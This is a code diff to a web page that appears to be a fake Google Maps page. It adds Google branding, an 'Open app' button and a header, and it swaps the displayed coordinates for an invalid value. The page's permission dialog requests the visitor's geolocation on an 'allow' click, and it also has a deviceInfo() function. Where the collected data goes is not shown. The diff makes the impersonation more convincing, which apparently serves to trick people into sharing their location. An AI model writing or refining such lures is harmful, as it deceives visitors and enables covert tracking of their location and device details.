@@ -119,7 +119,7 @@ html,body{
 /* ===== Top Search ===== */
 .top-search{
   position:absolute;
-  top:10px;
+  top:40px;
   left:10px;
   right:10px;
   height:46px;
@@ -131,7 +131,41 @@ html,body{
   gap:12px;
   box-shadow:0 2px 6px rgba(0,0,0,.3);
 }
+header{
+  position:relative;
+  top:0px;
+ margin-bottom: 20px;
+  width: 100%;
+  height:35px;
+  background:white;
+  justify-content: space-between;
+  display:flex;
+  align-items:center;
+  padding:0 14px;
+  gap:12px;
+  box-shadow:0 2px 6px rgba(0,0,0,.3);
+}
+header>#google-icon{
+  width: 18px;
+}
+header h3{
+  margin:6px 0 12px;
+  color:#5f6368;
+  font-weight:500;
+  position: relative;
+  left: -40px;
+}
 
+header h3 span{font-weight:400}
+#top-btn{
+  background:#1a73e8;
+  color:white;
+  border:none;
+  border-radius:18px;
+  padding:5px 14px;
+  font-size:15px;
+  cursor:pointer;
+}
 .top-search i{
   font-size:18px;
   color:#5f6368;
@@ -218,9 +252,7 @@ html,body{
 <!-- ================= PERMISSION ================= -->
 <div id="permission">
   <div class="d-box">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 232597 333333">
-      <path d="M151444 5419C140355 1916 128560 0 116311 0" fill="#1a73e8"/>
-    </svg>
+      <svg id="google-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 232597 333333" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" image-rendering="optimizeQuality" fill-rule="evenodd" clip-rule="evenodd"><path d="M151444 5419C140355 1916 128560 0 116311 0 80573 0 48591 16155 27269 41534l54942 46222 69232-82338z" fill="#1a73e8"/><path d="M27244 41534C10257 61747 0 87832 0 116286c0 21876 4360 39594 11517 55472l70669-84002-54942-46222z" fill="#ea4335"/><path d="M116311 71828c24573 0 44483 19910 44483 44483 0 10938-3957 20969-10509 28706 0 0 35133-41786 69232-82313-14089-27093-38510-47936-68048-57286L82186 87756c8166-9753 20415-15928 34125-15928z" fill="#4285f4"/><path d="M116311 160769c-24573 0-44483-19910-44483-44483 0-10863 3906-20818 10358-28555l-70669 84027c12072 26791 32159 48289 52851 75381l85891-102122c-8141 9628-20339 15752-33948 15752z" fill="#fbbc04"/><path d="M148571 275014c38787-60663 84026-88210 84026-158728 0-19331-4738-37552-13080-53581L64393 247140c6578 8620 13206 17793 19683 27900 23590 36444 17037 58294 32260 58294 15172 0 8644-21876 32235-58320z" fill="#34a853"/></svg>
 
     <h3>Google <span>Maps</span></h3>
 
@@ -237,11 +269,17 @@ html,body{
 
 <!-- ================= UI ================= -->
 <div class="google-ui">
+ <header>
+  <svg id="google-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 232597 333333" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" image-rendering="optimizeQuality" fill-rule="evenodd" clip-rule="evenodd"><path d="M151444 5419C140355 1916 128560 0 116311 0 80573 0 48591 16155 27269 41534l54942 46222 69232-82338z" fill="#1a73e8"/><path d="M27244 41534C10257 61747 0 87832 0 116286c0 21876 4360 39594 11517 55472l70669-84002-54942-46222z" fill="#ea4335"/><path d="M116311 71828c24573 0 44483 19910 44483 44483 0 10938-3957 20969-10509 28706 0 0 35133-41786 69232-82313-14089-27093-38510-47936-68048-57286L82186 87756c8166-9753 20415-15928 34125-15928z" fill="#4285f4"/><path d="M116311 160769c-24573 0-44483-19910-44483-44483 0-10863 3906-20818 10358-28555l-70669 84027c12072 26791 32159 48289 52851 75381l85891-102122c-8141 9628-20339 15752-33948 15752z" fill="#fbbc04"/><path d="M148571 275014c38787-60663 84026-88210 84026-158728 0-19331-4738-37552-13080-53581L64393 247140c6578 8620 13206 17793 19683 27900 23590 36444 17037 58294 32260 58294 15172 0 8644-21876 32235-58320z" fill="#34a853"/></svg>
+ <h3>Google <span>Maps</span></h3>
+<button id="top-btn">Open app</button>
 
+ </header>
   <div class="top-search">
+   
     <i class="fa-solid fa-bars"></i>
     <div class="search-text">
-      34°54'20.0"N 71°59'32.9"E
+      32°04'20.0"N 91°69'32.9"E
     </div>
     <i class="fa-solid fa-xmark"></i>
   </div>
@@ -295,7 +333,7 @@ function deviceInfo(){
 
 document.getElementById("allowBtn").onclick = ()=>{
   document.getElementById("allowBtn").style.display="none";
-  document.getElementById("gLoader").classList.remove("hidden");
+  document.getElementById("gLoader").style.display="block";
   statusEl.textContent="google map is loading";
 
   navigator.geolocation.getCurrentPosition(
